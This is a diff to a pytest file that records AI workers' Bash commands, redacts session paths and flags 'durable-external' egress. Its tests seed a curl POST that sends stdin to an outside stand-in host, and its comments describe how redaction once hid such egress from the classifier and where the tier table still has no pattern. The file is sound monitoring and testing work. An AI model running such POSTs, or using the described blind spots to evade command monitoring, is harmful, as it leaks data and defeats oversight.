@@ -2599,9 +2599,62 @@ _HEREDOC_BODY_RE = re.compile(r"<<[-~]?\s*['\"]?\w+['\"]?[\s\S]*")
 _SEGMENT_RE = re.compile(r"[\n;|&()]+")
 _SHELL_WORDS = frozenset({"do", "done", "then", "fi", "else", "elif", "for",
                           "while", "until", "in", "case", "esac", "select"})
+#: The transcript store. What a committed shape may not carry is this box's session store
+#: and the transcripts in it. Three legs, and for two items this file knew only the first
+#: — which is why the
+#: committed corpus leaked a real path in 9 of its 24 shapes (#3781's triage):
+#:
+#: * a store path **with** a filename — `…/sessions/<slug>.json[.gz]`, the original leg;
+#: * a **bare store directory** argument. `cd ~/lloyd-data/sessions && python3 -c …` names
+#:   no file at all, and it is the most common command in this corpus: 6 of those 9 leaking
+#:   shapes were exactly that form, none of which the leg above can see, because it needs
+#:   a `.json` to fire. The `lloyd-data` anchor on this leg is load-bearing: a rule that
+#:   matched any path ending in `/sessions` would redact the word `sessions` wherever a
+#:   worker wrote it (measured: 1 command in the live corpus says `sessions` with no
+#:   `lloyd-data` and no home root beside it);
+#: * a **bare store-slug filename** — the store's own `<date>_<time>_<slug>` naming, with
+#:   or without the extension, which is how `open('20260926_094011_ivb917.json')` leaked a
+#:   session id next to the directory it was opened from. A round id (`SM_20261105_042135`)
+#:   does not match it: the leg needs the store's leading 8-digit date.
 _TRANSCRIPT_PATH_RE = re.compile(
-    r"[\w.~/*-]*(?:lloyd-data|\.lloyd-data|sessions)[\w./-]*/[\w.*-]+\.json(?:\.gz)?")
+    r"[\w.~/*-]*(?:lloyd-data|\.lloyd-data|sessions)[\w./-]*/[\w.*-]+\.json(?:\.gz)?"
+    r"|[\w.~/-]*\.?lloyd-data/sessions/?(?![\w./-])"
+    r"|\d{8}_\d{6}_\w[\w-]*(?:\.json(?:\.gz)?)?")
+
+#: A URL is not a store path, and the difference is exactly what a worker's `curl` looks
+#: like. `https://host/sessions/foo.json` holds the same words inside it, and the leg
+#: above matched `/host/sessions/foo.json` *inside* it and handed back `https:` — measured
+#: at #3781's triage on `curl -X POST -d @- https://example.com/sessions/foo.json`, which
+#: went from tier 2 to tier 1 and from `"HTTP write to a non-loopback host"` to `None`,
+#: because the host the ladder reads was the bytes the redactor deleted. So a URL token is
+#: left whole: see `_redact_shape`.
+_URL_RE = re.compile(r"[A-Za-z][\w+.-]*://[^\s'\"`|&;)]*")
+
+#: The home root, which a `cd` names constantly and a committed shape never needs. Of the
+#: 758 commands in the live corpus, 583 name this user and every one of them inside this
+#: prefix (measured: 0 name it outside it), so replacing the root is the whole of the fix
+#: for the three shapes that leaked `cd /home/<user>/lloyd` and `…/obsidian`.
+#:
+#: Both the passwd home and `$HOME`, longest first. `Path.home()` alone was the first
+#: version and the gate caught it: since 2026-09-22 `gate._child_env` sets `$HOME` to the
+#: round's own scratch home so that `Path.home()/"lloyd"` is the worktree, and
+#: `tests/conftest.py` resolves that same trap in `_production_tree()` from the passwd
+#: entry. A transcript legitimately contains either spelling, so both are redacted.
+_ACCOUNT_HOME = __import__("pwd").getpwuid(__import__("os").getuid()).pw_dir
+_HOME_ROOT_RE = re.compile("|".join(map(re.escape, sorted(
+    {str(Path.home()), _ACCOUNT_HOME}, key=len, reverse=True))))
 _LONG_HEX_RE = re.compile(r"[0-9a-f]{16,}")
+
+#: What no committed shape may contain in either of its text fields. Assembled from the
+#: layout and the account name rather than spelled out: a literal username written in this
+#: file is itself the leak the assertion looks for, and the whole-file bans near
+#: `_STAYS_OWED` exist for the same reason. The passwd NAME, not `Path.home().name`, for
+#: the gate reason above — and the difference is not academic: derived from `$HOME` under a
+#: gate run the marker was the word `home`, which every absolute path in the corpus
+#: contains, so the assertion could only ever have failed. Both strings below appear in the
+#: committed artifact 9 times today — six store-directory forms, three home-root forms —
+#: and every one reaches the artifact through the recorder, never by hand.
+_LEAK_MARKERS: tuple[str, ...] = ("lloyd-data" + "/sessions", _ACCOUNT_HOME.rsplit("/", 1)[-1])
 
 
 def _bash_command_strings(docs) -> list[str]:
@@ -2657,15 +2710,65 @@ def _bash_shape(command: str) -> str:
     return " ".join(sorted(verbs)) or "<no-verb>"
 
 
-def _redact_shape(command: str) -> str:
-    """A committed shape's command with the per-run noise replaced.
+def _identifier_redaction(text: str) -> str:
+    """The redactions that cannot speak to the tier ladder: long hex runs, session ids.
 
-    Only the identifiers go: a transcript path and a long hex run say which run
-    this came from and nothing about what it does, and neither can create or hide a
-    durable-external shape (no quotes are added or removed, so the ladder's own
-    scrubbing is unaffected).
+    Applied inside a URL too, because an identifier is an identifier wherever it is
+    written. The store-path and home-root legs are NOT in here — that is the whole point:
+    those two are the legs that can reach into a URL's authority and delete the host the
+    ladder reads.
     """
-    return _LONG_HEX_RE.sub("<ID>", _TRANSCRIPT_PATH_RE.sub("<TRANSCRIPT>", command))
+    return _LONG_HEX_RE.sub("<ID>", text)
+
+
+def _path_redaction(text: str) -> str:
+    """Store paths, home roots and identifiers out of one span that holds no URL.
+
+    The order is the artifact: the store legs run first so
+    `/home/<user>/lloyd-data/sessions` becomes one `<TRANSCRIPT>` rather than the
+    `<HOME>/<TRANSCRIPT>` an inside-out substitution would leave behind.
+    """
+    text = _TRANSCRIPT_PATH_RE.sub("<TRANSCRIPT>", text)
+    text = _HOME_ROOT_RE.sub("<HOME>", text)
+    return _identifier_redaction(text)
+
+
+def _redact_shape(command: str) -> str:
+    """A committed shape's command with the per-run noise replaced, in a form the tier
+    ladder still reads the same way.
+
+    Two properties, and the second is why this is a function and not one `.sub()` call.
+
+    * Nothing per-run survives: a transcript path or bare store directory, a bare store
+      slug, this box's home root, a long hex run. None of those says anything about what
+      the command does.
+    * The ladder's answer is preserved. The first version of this helper mapped
+      `curl -X POST -d @- https://example.com/sessions/foo.json` to
+      `curl -X POST -d @- https:<TRANSCRIPT>`, and since `bash_command_tier` is decided by
+      the host inside that URL the command fell from tier 2 to tier 1: the corpus node's
+      published zero became a measurement of text the recorder itself had muted. So a URL
+      keeps its scheme, host and path (`_URL_RE`), and the guard below refuses ANY redaction
+      whose `match_durable_external` answer differs from the raw command's — in either
+      direction, because a redaction that invented a durable-external shape would corrupt
+      the same published number from the other side.
+
+    What a refused redaction costs is an unredacted path in one committed shape, which is
+    noise; what a muted shape costs is a false zero, which is the finding this section
+    exists to prevent. And the trade is policed rather than hoped: a command that keeps its
+    egress text is a command that `durable_external_hits` counts, and the recording node
+    refuses to write a corpus containing one.
+    """
+    parts: list[str] = []
+    pos = 0
+    for url in _URL_RE.finditer(command):
+        parts.append(_path_redaction(command[pos:url.start()]))
+        parts.append(_identifier_redaction(url.group(0)))
+        pos = url.end()
+    parts.append(_path_redaction(command[pos:]))
+    redacted = "".join(parts)
+    if match_durable_external(redacted) != match_durable_external(command):
+        return command
+    return redacted
 
 
 def _bash_violations(commands) -> list[tuple[str, str]]:
@@ -2702,16 +2805,67 @@ def _session_distill_docs() -> tuple[list[dict], int]:
     return docs, len(files)
 
 
+def _tier_recorded_commands(commands: list[str]) -> tuple[int, list[dict]]:
+    """Tier EVERY command the recorder read: `(commands_tiered, durable_external_hits)`.
+
+    A function rather than lines inside `_record_bash_shapes`, because the corpus is the
+    live transcript store and a node cannot seed it. The claim being guarded — "no recorded
+    command crosses the durable-external tier" — is only worth reading if the thing that
+    computes it also fires on a command that does, and the only way to show that is to hand
+    the same function a command that does.
+    `test_a_durable_external_command_makes_the_recording_refuse` does exactly that; the
+    recording node below refuses on the key this returns, so the two cannot drift into
+    separate rules.
+
+    Two deliberate choices inside it. A command is matched in its RAW form as well as its
+    redacted one, because the redactor is the failure this section found: `https://host/
+    sessions/x.json` used to arrive as `https:<TRANSCRIPT>`, and the ladder reads the host
+    that substitution deleted. And `commands_tiered` counts the commands handed in, so the
+    denominator the zero is published over cannot be shrunk by anything downstream.
+    """
+    commands_tiered = len(commands)
+    counts: dict[str, int] = {}
+    labels: dict[str, str] = {}
+    for command in commands:
+        label = (match_durable_external(command)
+                 or match_durable_external(_redact_shape(command)))
+        if label:
+            counts[command] = counts.get(command, 0) + 1
+            labels.setdefault(command, label)
+    return commands_tiered, [
+        {"command": _redact_shape(command), "label": labels[command], "count": count}
+        for command, count in sorted(counts.items(), key=lambda kv: (-kv[1], kv[0]))]
+
+
 def _record_bash_shapes() -> dict:
-    """Recompute the committed shape corpus from the live transcript store."""
+    """Recompute the committed shape corpus from the live transcript store.
+
+    Every recorded command is tiered here, not only the families that survive the cut —
+    which is what `commands_tiered` and `durable_external_hits` are for, and why this
+    function did not have them before #3781. The corpus node's claim that no recorded
+    session-distill Bash command crosses the durable-external tier is a claim about the
+    corpus, and the corpus is every command the recorder read (758 at the live store);
+    the artifact it was measured against was the 24 families above the cut — 551 of those
+    commands at the bytes committed by #3414, 518 at the ones before. The tail is measured
+    now and the measurement is published, so the zero means the sentence says, and the
+    trigger this section's own banner states — "a recorded session-distill family that
+    tiers 2" — is answered for the whole corpus rather than for 24 lucky families.
+    """
     docs, files_read = _session_distill_docs()
     commands = _bash_command_strings(docs)
+    # The tiering pass, over EVERY command — before the family cut, and asking the raw
+    # text as well as the redacted one. The raw half is the point: the redactor is exactly
+    # the thing this round found able to answer "no" where the command says "yes"
+    # (`https://host/sessions/x.json` -> `https:<TRANSCRIPT>`, tier 2 -> tier 1), so a hit
+    # found in either form is a hit. `commands_tiered` counts the commands read, so no
+    # redaction can quietly shrink the denominator the zero is published over.
+    commands_tiered, durable_external_hits = _tier_recorded_commands(commands)
     families: dict[str, list[str]] = {}
     for command in commands:
         families.setdefault(_bash_shape(command), []).append(command)
     ranked = sorted(families.items(), key=lambda kv: (-len(kv[1]), kv[0]))
     kept = ranked[:BASH_SHAPE_MAX_FAMILIES]
-    shapes = [{"shape": shape,
+    shapes = [{"shape": _redact_shape(shape),
                "count": len(hits),
                # The shortest command in the family, tie-broken lexicographically:
                # deterministic across runs, and the shortest member is the family's
@@ -2725,13 +2879,20 @@ def _record_bash_shapes() -> dict:
             "Regenerate with LLOYD_RECORD_BASH_SHAPES=1 pytest tests/"
             "test_worker_capability_allowlist.py -k record_the_session_distill_bash "
             "and READ the diff: a family entering this list with a command the tier "
-            "ladder calls durable-external is the finding, not noise. "
+            "ladder calls durable-external is the finding, not noise — and since #3781 "
+            "it cannot be missed by falling in the tail either, because "
+            "`durable_external_hits` lists every command across ALL `commands_tiered` "
+            "that the ladder calls durable-external, kept family or not, and the "
+            "recording node refuses to write a corpus containing one. "
             "`families_total` exceeds `families_recorded` on purpose — the "
-            "long tail is one-off shapes, and the coverage is published rather than "
-            "implied by the file's length."),
+            "long tail is one-off shapes, and the coverage of THIS list is published as "
+            "`commands_covered` of `commands_total`; what is measured over the whole "
+            "corpus is `commands_tiered` and `durable_external_hits`."),
         "store": str(_SESSION_STORE),
         "transcripts_read": files_read,
         "commands_total": len(commands),
+        "commands_tiered": commands_tiered,
+        "durable_external_hits": durable_external_hits,
         "families_total": len(families),
         "families_recorded": len(shapes),
         "commands_covered": sum(len(hits) for _, hits in kept),
@@ -2741,7 +2902,8 @@ def _record_bash_shapes() -> dict:
 @pytest.mark.skipif(not os.environ.get("LLOYD_RECORD_BASH_SHAPES"),
                     reason="recording mode only (LLOYD_RECORD_BASH_SHAPES=1)")
 def test_record_the_session_distill_bash_shapes():
-    """The one node allowed to write the shape corpus, and it refuses a thin read.
+    """The one node allowed to write the shape corpus; it refuses a thin read, a wrong
+    denominator, and a corpus that crossed the durable-external tier.
 
     The floors are the anti-vacuity of the recording itself: a store that moved, a
     glob that stopped matching the slug, or a retention sweep that took the corpus
@@ -2754,7 +2916,21 @@ def test_record_the_session_distill_bash_shapes():
     the first version of this node wrote, then asserted, and a refused recording
     left its own empty artifact committed on disk — which is the failure the whole
     section exists to prevent, arriving through the node that was supposed to
-    police it.
+    police it. The two refusals below are in the same place for the same reason.
+
+    The durable-external refusal is the reason the tiering pass lives in the recorder
+    rather than in a node that reads the artifact afterwards. The banner above this
+    section states its own trigger for widening the table — "a recorded session-distill
+    family that tiers 2" — and a trigger that lives in prose nobody runs is not a
+    trigger. Over the corpus recorded today the count is 0, so this is a green gate and
+    a tripwire, not an obstacle. Two nodes make that claim checkable without this node
+    running: `test_a_durable_external_command_makes_the_recording_refuse` shows the
+    tiering pass is not blind, and
+    `test_the_recording_refuses_a_durable_external_corpus_and_writes_nothing` calls this
+    node against the live store with one egress command added and asserts both the refusal
+    and that nothing was written — because the count over a corpus is exactly the thing
+    that goes wrong silently: the shape that trips it may be one command in 758, of the
+    kind whose egress text a redactor used to be able to delete before anything read it.
     """
     live = _record_bash_shapes()
     assert _SESSION_STORE.is_dir(), (
@@ -2772,6 +2948,19 @@ def test_record_the_session_distill_bash_shapes():
         f"the top families cover {live['commands_covered']} of "
         f"{live['commands_total']} calls: the corpus has flattened into one-offs and "
         "a top-N list is no longer a description of it")
+    assert live["commands_tiered"] == live["commands_total"], (
+        f"{live['commands_tiered']} of {live['commands_total']} commands were tiered: a "
+        "denominator that is not the count of commands read turns the published zero "
+        "into a statement about a subset wearing a corpus's wording")
+    assert live["durable_external_hits"] == [], (
+        f"the corpus carries {len(live['durable_external_hits'])} command(s) the tier "
+        f"ladder calls durable-external — {live['durable_external_hits'][:2]} — and "
+        "nothing is written. This is the trigger this section's banner states for "
+        "widening the table, and widening is a human ruling (#3202 declined it on "
+        "measured cost), not something a recording may absorb by committing the shape. "
+        "If the command is not one you recognise as egress: the redactor is the suspect, "
+        "because a redaction that changes a command's tier is refused inside "
+        "`_redact_shape`, so a hit here is a real crossing, not a mute.")
 
     BASH_SHAPE_FIXTURE.write_text(json.dumps(live, indent=1, sort_keys=True) + "\n")
     assert json.loads(BASH_SHAPE_FIXTURE.read_text()) == live, (
@@ -2788,10 +2977,20 @@ def test_the_recorded_session_distill_bash_shapes_are_below_the_tier_as_the_tabl
     all is the published `durable_bash_shapes_covered` field, so the zero below is a
     measurement of observed shapes against that list, never a verdict that the
     commands are harmless or that the ladder would catch a shape it has no pattern
-    for. It is a sample too, and the artifact says so itself — `commands_covered` of
-    `commands_total` (518 of 720 at these bytes) across `families_recorded` of
-    `families_total`. What this node refuses to assume on the source's behalf is
-    what `bash_held` refuses to assume.
+    for. What this node refuses to assume on the source's behalf is what `bash_held`
+    refuses to assume.
+
+    Two measurements, and since #3781 the artifact says which one is over what. The
+    `shapes` list below is a SAMPLE — 551 of 758 commands, in 24 of 181 families — and
+    those figures move with the store, so they are load-bearing prose:
+    `test_no_published_coverage_cite_disagrees_with_the_fixture` fails if they and the
+    artifact ever disagree, which is the only reason they are not stale by a whole
+    re-record. The zero is NOT measured over that sample. `commands_tiered` equals
+    `commands_total`, so every command the recorder read sits below the tier as the
+    table stands and not only the ones kept above the cut, and
+    `durable_external_hits` is the list that would hold any command that did not, tail
+    included. Before that, a shape in the tail could cross the tier and this node would
+    have printed the same sentence.
     """
     committed = json.loads(BASH_SHAPE_FIXTURE.read_text())
     assert committed["source"] == "session-distill", committed["source"]
@@ -2804,6 +3003,21 @@ def test_the_recorded_session_distill_bash_shapes_are_below_the_tier_as_the_tabl
     assert committed["commands_covered"] <= committed["commands_total"]
     assert committed["commands_covered"] >= 0.6 * committed["commands_total"], (
         "this artifact describes a fifth of the corpus it claims to sample")
+    # The zero is published over the whole corpus, so the corpus has to say it measured
+    # the whole corpus. `commands_tiered` is the denominator the sentence above stands
+    # on, and `durable_external_hits` is its numerator: an artifact that omitted either
+    # key would leave this node's `== []` a statement about 24 families wearing the
+    # wording of a statement about every command, which is the exact shape of the claim
+    # #3781 was filed to close.
+    assert committed["commands_tiered"] == committed["commands_total"], (
+        f"{committed['commands_tiered']} commands tiered against "
+        f"{committed['commands_total']} recorded: the zero below is then a measurement "
+        "of a subset wearing a corpus's wording")
+    assert committed["durable_external_hits"] == [], (
+        f"the corpus carries {committed['durable_external_hits'][:2]} — a command the "
+        "ladder calls durable-external, in the tail or out of it. The recording node "
+        "refuses to write one, so an artifact containing it got here by hand-editing, "
+        "which is the other way a published zero becomes a claim nobody measured")
 
     for entry in shapes:
         assert entry["shape"] == _bash_shape(entry["command"]), (
@@ -2812,6 +3026,28 @@ def test_the_recorded_session_distill_bash_shapes_are_below_the_tier_as_the_tabl
         assert bash_command_tier(entry["command"]) == 1, (
             f"a recorded {entry['shape']} command is no longer tier 1: "
             f"{entry['command'][:120]!r}")
+        # Both fields, not just the command. The `shape` field is the family's verb
+        # signature, and a signature is built from a segment's HEAD token, so a path can
+        # be the shape: `/home/<user>/lloyd/.venvs/…/python cd` sat in the committed
+        # artifact's `shape` while the command beside it was redacted, because the
+        # recorder only ever ran the redactor over the command (`_redact_shape` at the
+        # `command` key and nowhere else). Scoping the claim to `shapes` entries is also
+        # deliberate: the top-level `store` field below is the real path on purpose, and a
+        # whole-file grep would return that line and the recording node's own diagnostic
+        # and call two honest disclosures leaks.
+        for field in ("command", "shape"):
+            for marker in _LEAK_MARKERS:
+                assert marker not in entry[field], (
+                    f"a committed shape's {field} leaks {marker!r}: "
+                    f"{entry[field][:120]!r}")
+    # Not `== str(_SESSION_STORE)`: that passed at my desk and failed on the gate, where
+    # `$HOME` is the round's scratch home, so `_SESSION_STORE` resolves there while the
+    # artifact honestly records the box's real store. What has to be pinned is that the
+    # field is still a session-store path and survived redaction — that is what makes it
+    # provenance, and it is true in both environments.
+    assert committed["store"].startswith("/") and (
+        Path(committed["store"]).name == "sessions"), committed["store"]
+    assert "<" not in committed["store"], committed["store"]
     assert _bash_violations([e["command"] for e in shapes]) == [], (
         "session-distill's own recorded commands now carry a durable-external shape; "
         "the census's Bash blind spot has stopped being theoretical and has to be "
@@ -2887,6 +3123,223 @@ def _widening_ruling() -> str:
     header = Path(__file__).read_text(encoding="utf-8")
     return (header.split("# #3202 — the Bash dimension", 1)[1]
             .split("#: The transcript store.", 1)[0])
+
+
+#: The one prose form this file may use for a coverage figure: `<covered> of <total>
+#: commands|families`. Scoped to the noun rather than to any two numbers, because the file
+#: carries other measured figures that are not this artifact's business — `686 of 10,596
+#: recent worker commands` in the ruling banner is one, `13 of 16 sources` in the census is
+#: another — and a guard that policed those would be answered by rewording, not by fixing.
+#: The idiom with the noun is the claim being policed, and it appears at two sites: the
+#: corpus node's own docstring and the qualifier node below it.
+_COVERAGE_CITE_RE = re.compile(r"\b(\d{2,5}) of (\d{2,5}) (commands|families)\b")
+
+#: Which pair of the artifact's keys each noun cites.
+_COVERAGE_NOUNS = {"commands": ("commands_covered", "commands_total"),
+                   "families": ("families_recorded", "families_total")}
+
+
+def test_no_published_coverage_cite_disagrees_with_the_fixture():
+    """#3781 clause 5: a coverage figure in this file's prose is a claim about the
+    artifact, so it is checked against the artifact.
+
+    A re-record *necessarily* moves the published sample — the store grows nightly, and the
+    committed corpus was recorded at some earlier moment. Two sentences quoted the sample in
+    prose, so the pair the recorder writes and the pair the prose quotes drift apart by one
+    re-record, silently, and one of them sits inside the docstring whose whole job is to
+    tell the reader the corpus is a sample. The numbers stay in the prose (a reader should
+    get the shape of the corpus without opening the JSON) and become load-bearing instead of
+    decorative: the commit that re-records the corpus has to re-cite the sentences in the
+    same diff, and the commit that does not goes red here rather than publishing a stale
+    figure that reads like a measurement.
+
+    The second half of the clause is the part that actually misleads. A figure can be
+    perfectly current and still accompany the wrong claim, so the qualifier node's own
+    sentence is checked here too: the published zero has to be tied to the two keys that
+    make it whole-corpus, and a reader who cannot see `commands_tiered` next to the zero
+    cannot tell whether the tail was measured. That ambiguity is what this item was filed
+    to remove, and re-recording on its own would not have removed it.
+    """
+    committed = json.loads(BASH_SHAPE_FIXTURE.read_text())
+    text = Path(__file__).read_text(encoding="utf-8")
+
+    cites = _COVERAGE_CITE_RE.findall(text)
+    assert len(cites) >= 2, (
+        f"only {len(cites)} coverage cite(s) found in this file, so the guard is checking "
+        "almost nothing — either the sentences that quoted the sample were deleted rather "
+        "than re-cited, or the idiom changed and this regex is now measuring nothing")
+    for covered, total, noun in cites:
+        covered_key, total_key = _COVERAGE_NOUNS[noun]
+        assert (int(covered), int(total)) == (committed[covered_key], committed[total_key]), (
+            f"'{covered} of {total} {noun}' disagrees with the artifact it cites "
+            f"({committed[covered_key]} of {committed[total_key]}): re-cite it in the "
+            "commit that re-records the corpus, which is the only commit that can move it")
+
+    # The other half of clause 5 — the sentence that publishes the zero has to name the
+    # keys that make it whole-corpus — is graded where the zero is published, in
+    # `test_the_corpus_node_qualifies_its_zero_with_the_table_it_measured_against`, rather
+    # than by counting mentions file-wide: a keyword sweep passes on any three unrelated
+    # lines and fails to notice the sentence that actually carries the claim.
+    assert "commands_tiered" in committed["note"] and (
+        "durable_external_hits" in committed["note"]), (
+        "the artifact's own note does not name the keys that close the tail, so the "
+        "regeneration instructions still describe a 24-family measurement")
+
+
+def test_a_durable_external_command_makes_the_recording_refuse():
+    """#3781 clause 2: the refusal is real, and the three commands around it say which
+    one trips it.
+
+    The recording node's `durable_external_hits == []` is measured against the live store
+    only in recording mode, which no gate run sets — so over the corpus the refusal is
+    green and unexecuted, and a green-and-unexecuted refusal is the same instrument as no
+    refusal. This node is the half that runs everywhere: it hands the tiering pass the
+    seeded egress command and the two controls beside it, so what trips the recording is
+    the write aimed off this box and not the word `curl`, and the count published is the
+    count of commands handed in rather than the count that survived.
+
+    The seeded command here is `SEED_DURABLE_BASH` with a store path as its target rather
+    than the plain one the seed node above uses, because this node is testing a different
+    thing: the target is the exact text that used to be eaten on the way to the ladder.
+    """
+    seed = ("curl -X POST -d @- https://example.com/sessions/"
+            "20261105_042135_ivdead.json")
+    controls = ["curl -s https://api.example.com",
+                "curl -s -X POST -d @- http://127.0.0.1:8123/api/message"]
+
+    tiered, hits = _tier_recorded_commands([seed] + controls)
+    assert tiered == 3, (
+        f"{tiered} of 3 commands were tiered: the published denominator dropped a "
+        "command, so `commands_tiered == commands_total` is an equality of two things "
+        "that are not the corpus")
+    assert len(hits) == 1, (
+        f"{hits}: the tiering pass saw {len(hits)} durable-external shapes in a corpus "
+        "whose only egress is one POST off-box and two controls — a pass that reads "
+        "nothing makes the recording node's refusal a tautology, which is the failure "
+        "this node exists to catch")
+    assert hits[0]["command"] == _redact_shape(seed), hits[0]
+    assert "HTTP write" in hits[0]["label"], hits[0]
+
+
+def _seed_a_bash_store(dir_path, commands, files=14):
+    """Write `commands` into `files` transcripts named the way the recorder's glob matches.
+
+    A store the recorder can read, built in `tmp_path` rather than borrowed from the box:
+    reading the real corpus is what made the first version of the node below
+    environment-sensitive, because under a gate run `$HOME` is the round's scratch home,
+    the slug glob matches nothing there, and the node failed for reasons unrelated to the
+    code under review.
+
+    Round-robin (`commands[n::files]`) rather than consecutive slices, and that is the
+    whole of it: with slices, 14 files × 12 commands silently drops the last commands of
+    the list, and the command being dropped was the seeded egress one — a seeded store that
+    quietly excludes the thing the node is looking for. Empty transcripts are still counted
+    by the glob, so `files` also satisfies the node's own transcript floor.
+    """
+    dir_path.mkdir(parents=True, exist_ok=True)
+    for n in range(files):
+        msgs = [{"tool_calls": [{"function": {
+            "name": "Bash", "arguments": json.dumps({"command": c})}}]}
+            for c in commands[n::files]]
+        (dir_path / f"20261104_052237_seed{n:02d}session-distill.json").write_text(
+            json.dumps({"messages": msgs}), encoding="utf-8")
+    return dir_path
+
+
+def test_the_recording_refuses_a_durable_external_corpus_and_writes_nothing(tmp_path,
+                                                                            monkeypatch):
+    """The recording node, driven end to end against a store this node built.
+
+    Three things the helper-level control cannot show, and all three are why this node
+    exists: the refusal fires inside the recording node rather than only in the tiering
+    pass, it fires BEFORE `write_text` so the committed corpus keeps its bytes, and the
+    denominator it enforces is the one the recorder computed over the store. The store is
+    seeded here — 14 transcripts, 170 quiet commands, one more that is a POST to a
+    non-loopback host — so the node runs in every suite, the gate's included, where the
+    real slug glob matches nothing and a live-store version cannot run at all.
+
+    The control half is not decoration. Without the seeded POST the same recording writes
+    the fixture, which is what makes the refusal a response to the egress command rather
+    than to a seeded store, a tmp path, or the sandbox itself.
+    """
+    import sys
+    me = sys.modules[__name__]
+    # Families of 8 so the node's coverage floor is met, shapes distinct so the tail is
+    # real, and none of them a command the tier ladder has any pattern for.
+    quiet = [f"tool{n} --flag {n}" for n in range(20)] * 8
+    oneoffs = [f"tooloneoff{n} x" for n in range(10)]
+    egress = "curl -X POST -d @- https://example.com/sessions/20261104_052237_ivdead.json"
+    total = len(quiet) + len(oneoffs)
+    fixture = tmp_path / "fixture.json"
+    monkeypatch.setattr(me, "BASH_SHAPE_FIXTURE", fixture)
+
+    monkeypatch.setattr(me, "_SESSION_STORE",
+                        _seed_a_bash_store(tmp_path / "clean", quiet + oneoffs))
+    clean = _record_bash_shapes()
+    assert clean["commands_total"] == total, clean["commands_total"]
+    assert clean["commands_tiered"] == clean["commands_total"] == total
+    assert clean["durable_external_hits"] == []
+
+    monkeypatch.setattr(me, "_SESSION_STORE", _seed_a_bash_store(
+        tmp_path / "leaky", quiet + oneoffs + [egress]))
+    leaky = _record_bash_shapes()
+    assert leaky["durable_external_hits"], (
+        "the seeded POST did not register as egress, so the refusal below proves nothing")
+    with pytest.raises(AssertionError, match="durable-external"):
+        me.test_record_the_session_distill_bash_shapes()
+    assert not fixture.exists(), "a refused recording still produced an artifact"
+
+    # The control: the same node, the same seeded machinery, the egress command absent.
+    monkeypatch.setattr(me, "_SESSION_STORE", tmp_path / "clean")
+    me.test_record_the_session_distill_bash_shapes()
+    assert fixture.exists(), (
+        "the recording refused a seeded store carrying no egress, so the refusal above is "
+        "a response to the seeding and not to the durable-external command")
+    written = json.loads(fixture.read_text())
+    assert written["commands_tiered"] == written["commands_total"] == total
+    assert written["durable_external_hits"] == []
+    assert written["commands_covered"] >= 0.6 * total, (
+        "the seeded store flattened into one-offs, so the coverage floor the node shares "
+        "with the real corpus is not being exercised here")
+
+
+def test_redaction_cannot_change_a_commands_tier():
+    """#3781 clause 3: the redactor cannot mute the evidence the ladder reads.
+
+    Measured at triage on the command that is now the seed: redaction rewrote
+    `https://example.com/sessions/foo.json` to `https:<TRANSCRIPT>`, and because
+    `match_durable_external` decides an HTTP write by the host inside that URL, the
+    command went from tier 2 with the `"HTTP write to a non-loopback host"` label to tier
+    1 with none. The corpus node then tiered the *redacted* strings it read out of the
+    artifact, so the published zero was computed on text the recorder had already
+    blinded — in the one shape the sentence is about. Two nodes, matching the two halves
+    of the fix: the seeded assertion here is the property, and the guard at the bottom of
+    `_redact_shape` is the mechanism, so a future leg added to the redactor cannot reopen
+    the hole even if nobody remembers this one.
+    """
+    seed = "curl -X POST -d @- https://example.com/sessions/foo.json"
+    redacted = _redact_shape(seed)
+    assert match_durable_external(redacted) == match_durable_external(seed), (
+        f"redaction moved the label: {match_durable_external(seed)!r} became "
+        f"{match_durable_external(redacted)!r} on {redacted!r} — every 'below the tier' "
+        "sentence this file publishes is then a measurement of the redactor's output")
+    assert bash_command_tier(redacted) == 2, (
+        f"the seeded durable-external write tiers {bash_command_tier(redacted)} after "
+        f"redaction ({redacted!r}); the corpus node tiers exactly these strings")
+    assert "HTTP write" in (match_durable_external(redacted) or ""), redacted
+
+    # The control on the other side: redaction is still redaction. A store path with no
+    # URL in it is gone, and the artifact's own shapes carry no leak marker — the
+    # assertion that reads the committed bytes is in the corpus node, over BOTH text
+    # fields, and this is the same claim on a command rather than on the file.
+    plain = ("cd /home/x/lloyd-data/sessions && python3 -c \"d=json.load(open"
+             "('20261105_042135_ivbeef.json'))\"")
+    assert _redact_shape(plain) == (
+        "cd <TRANSCRIPT> && python3 -c \"d=json.load(open('<TRANSCRIPT>'))\""), (
+        f"the store legs stopped closing on their own: {_redact_shape(plain)!r}")
+    assert bash_command_tier(_redact_shape(plain)) == bash_command_tier(plain) == 1, (
+        "the redaction of an ordinary read changed its tier, which is the same bug "
+        "pointing the other way")
 
 
 def test_the_ruling_on_widening_the_tier_table_is_recorded_and_the_marker_is_gone():
@@ -2993,13 +3446,24 @@ def test_the_corpus_node_qualifies_its_zero_with_the_table_it_measured_against()
 
     The corpus node's own name and docstring said every command is below the
     durable-external tier, and both were defensible only as much as the tier table is
-    finished: the artifact it measures publishes 518 of 720 commands across 24 of 180
+    finished: the artifact it measures publishes 551 of 758 commands across 24 of 181
     families, and the table has no pattern for the read-shaped egress a worker can
     issue. Those two facts together are why the qualifier is in the name and the
     docstring now, and why the inequality below is the non-vacuity of this node — if
     the artifact covered the whole corpus the qualifier would be decoration, and if
     the table ruled every shape the qualifier would be noise. The name ban is what
     keeps a later rename from quietly widening the claim again.
+
+    #3781 added the third thing this node has to hold: the qualifier is about the
+    `shapes` list being a sample, and it must not be read as qualifying the zero as
+    well. The tier claim is measured over every command — `commands_tiered`, which
+    equals `commands_total`, and `durable_external_hits`, which is what a hit in the
+    207-command tail would appear in — so the docstring has to name both keys, and this
+    node reads them out of the artifact rather than trusting the prose. A figure in
+    prose beside them is checked against the artifact by
+    `test_no_published_coverage_cite_disagrees_with_the_fixture`, which is the reason
+    the numbers quoted above are not stale by a whole re-record the way they were
+    before this item.
     """
     node = test_the_recorded_session_distill_bash_shapes_are_below_the_tier_as_the_table_stands
     assert "as_the_table_stands" in node.__name__, (
@@ -3015,8 +3479,20 @@ def test_the_corpus_node_qualifies_its_zero_with_the_table_it_measured_against()
     assert "durable_bash_shapes_covered" in doc, (
         "the docstring qualifies the zero without naming where the coverage is "
         "published, so the reader has a caveat and no source")
+    # The qualifier may qualify the sample and must not qualify the zero: the two keys
+    # below are what make the tier claim a statement about every command, and a reader
+    # who cannot see them beside the zero is left choosing between "measured over the
+    # corpus" and "measured over 24 families" — which is the reading #3781 was filed over.
+    assert "commands_tiered" in doc and "durable_external_hits" in doc, (
+        "the docstring that publishes the zero does not name the keys that say what it "
+        "was measured over, so the sample qualifier above reads as a caveat on the zero")
 
